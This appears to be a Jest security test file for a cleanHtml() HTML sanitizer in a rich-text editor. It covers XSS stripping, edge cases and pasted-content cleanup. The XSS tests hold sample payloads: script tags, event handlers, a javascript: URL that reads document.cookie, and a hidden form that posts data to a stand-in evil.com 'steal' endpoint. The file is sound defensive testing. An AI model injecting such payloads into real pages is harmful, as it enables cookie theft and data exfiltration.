/**
 * Security-focused tests for cleanHtml()
 */

const { cleanHtml } = require("../../richTextFieldWithTables/v1/index.js");

describe("cleanHtml - XSS prevention", () => {
  test("strips <script> tags completely", () => {
    const result = cleanHtml("<script>alert('xss')</script>");
    expect(result).not.toContain("<script");
    expect(result).not.toContain("</script");
  });

  test("strips <script> with attributes", () => {
    const result = cleanHtml(
      '<script type="text/javascript" src="evil.js"></script>',
    );
    expect(result).not.toContain("<script");
  });

  test("strips onclick handler", () => {
    const result = cleanHtml('<p onclick="alert(1)">text</p>');
    expect(result).not.toContain("onclick");
    expect(result).toContain("text");
  });

  test("strips onload handler", () => {
    const result = cleanHtml('<p onload="alert(1)">text</p>');
    expect(result).not.toContain("onload");
  });

  test("strips onmouseover handler", () => {
    const result = cleanHtml('<p onmouseover="alert(1)">text</p>');
    expect(result).not.toContain("onmouseover");
  });

  test("strips onerror handler", () => {
    const result = cleanHtml('<p onerror="alert(1)">text</p>');
    expect(result).not.toContain("onerror");
  });

  test("strips onfocus handler", () => {
    const result = cleanHtml('<p onfocus="alert(1)">text</p>');
    expect(result).not.toContain("onfocus");
  });

  test("strips javascript: protocol in links", () => {
    const result = cleanHtml(
      '<a href="javascript:alert(document.cookie)">click</a>',
    );
    expect(result).not.toContain("javascript:");
    expect(result).toContain("click");
  });

  test("strips data: protocol in links", () => {
    const result = cleanHtml(
      '<a href="data:text/html,<script>alert(1)</script>">click</a>',
    );
    expect(result).toContain("click");
  });

  test("strips <iframe> tags", () => {
    const result = cleanHtml(
      '<iframe src="https://evil.com" onload="alert(1)"></iframe>',
    );
    expect(result).not.toContain("<iframe");
  });

  test("strips <object> tags", () => {
    const result = cleanHtml(
      '<object data="evil.swf" type="application/x-shockwave-flash"></object>',
    );
    expect(result).not.toContain("<object");
  });

  test("strips <embed> tags", () => {
    const result = cleanHtml('<embed src="evil.swf">');
    expect(result).not.toContain("<embed");
  });

  test("strips <form> tags", () => {
    const result = cleanHtml(
      '<form action="https://evil.com/steal"><input type="hidden" name="data" value="secret"></form>',
    );
    expect(result).not.toContain("<form");
    expect(result).not.toContain("<input");
  });

  test("strips <meta> tags", () => {
    const result = cleanHtml(
      '<meta http-equiv="refresh" content="0;url=https://evil.com">',
    );
    expect(result).not.toContain("<meta");
  });

  test("strips <base> tags", () => {
    const result = cleanHtml('<base href="https://evil.com/">');
    expect(result).not.toContain("<base");
  });

  test("strips <svg> tags", () => {
    const result = cleanHtml(
      '<svg onload="alert(1)"><circle r="50"></circle></svg>',
    );
    expect(result).not.toContain("<svg");
  });

  test("strips <math> tags", () => {
    const result = cleanHtml("<math><mi>x</mi></math>");
    expect(result).not.toContain("<math");
  });
});

describe("cleanHtml - edge cases", () => {
  test("handles deeply nested allowed tags", () => {
    const input =
      "<p><b><i><u><strike><sup><sub>deep</sub></sup></strike></u></i></b></p>";
    const result = cleanHtml(input);
    expect(result).toContain("deep");
    expect(result).toContain("<b>");
    expect(result).toContain("<i>");
    expect(result).toContain("<u>");
  });

  test("handles empty tags", () => {
    expect(cleanHtml("<p></p>")).toBe("<p></p>");
    expect(cleanHtml("<b></b>")).toBe("<b></b>");
  });

  test("handles self-closing br", () => {
    expect(cleanHtml("<br>")).toBe("<br>");
  });

  test("handles multiple consecutive br tags", () => {
    expect(cleanHtml("<br><br><br>")).toBe("<br><br><br>");
  });

  test("handles mixed allowed and disallowed tags", () => {
    const input = "<div><p>keep</p><span>also keep</span></div>";
    const result = cleanHtml(input);
    expect(result).toContain("<p>keep</p>");
    expect(result).toContain("<span>also keep</span>");
    expect(result).not.toContain("<div");
  });

  test("handles very long input", () => {
    const longText = "a".repeat(10000);
    const input = "<p>" + longText + "</p>";
    const result = cleanHtml(input);
    expect(result).toBe(input);
  });

  test("handles unicode content", () => {
    const input = "<p>日本語テスト 🎉 émojis</p>";
    const result = cleanHtml(input);
    expect(result).toContain("日本語テスト");
    expect(result).toContain("🎉");
  });

  test("handles HTML entities", () => {
    const input = "<p>&amp; &lt; &gt; &quot;</p>";
    const result = cleanHtml(input);
    expect(result).toContain("&amp;");
    expect(result).toContain("&lt;");
  });

  test("preserves link with target attribute", () => {
    const input = '<a href="https://example.com" target="_blank">link</a>';
    const result = cleanHtml(input);
    expect(result).toContain('target="_blank"');
    expect(result).toContain('href="https://example.com"');
  });
});

describe("cleanHtml - paste from various sources", () => {
  test("cleans paste from Microsoft Word", () => {
    const wordPaste =
      '<p class="MsoNormal" style="font-size: 11pt; font-family: Calibri, sans-serif; margin: 0in;"><b><span style="font-size: 14px;">Title</span></b></p><!--[if gte mso 9]><xml></xml><![endif]-->';
    const result = cleanHtml(wordPaste, true);
    expect(result).not.toContain("MsoNormal");
    expect(result).not.toContain("Calibri");
    expect(result).not.toContain("<!--");
    expect(result).toContain("<b>");
    expect(result).toContain("Title");
  });

  test("cleans paste from web page with divs and classes", () => {
    const webPaste =
      '<div class="article-body"><div class="paragraph"><p class="lead">First paragraph</p></div><div class="paragraph"><p>Second paragraph</p></div></div>';
    const result = cleanHtml(webPaste, true);
    expect(result).not.toContain("<div");
    expect(result).toContain("<p>");
    expect(result).toContain("First paragraph");
    expect(result).toContain("Second paragraph");
  });

  test("handles paste of multiline plain text", () => {
    const multiline = "Line 1\nLine 2\nLine 3";
    const result = cleanHtml(multiline, true);
    expect(result).toBe("Line 1<br>Line 2<br>Line 3");
  });

  test("handles paste of Windows-style multiline text", () => {
    const multiline = "Line 1\r\nLine 2\r\nLine 3";
    const result = cleanHtml(multiline, true);
    expect(result).toBe("Line 1<br>Line 2<br>Line 3");
  });
});
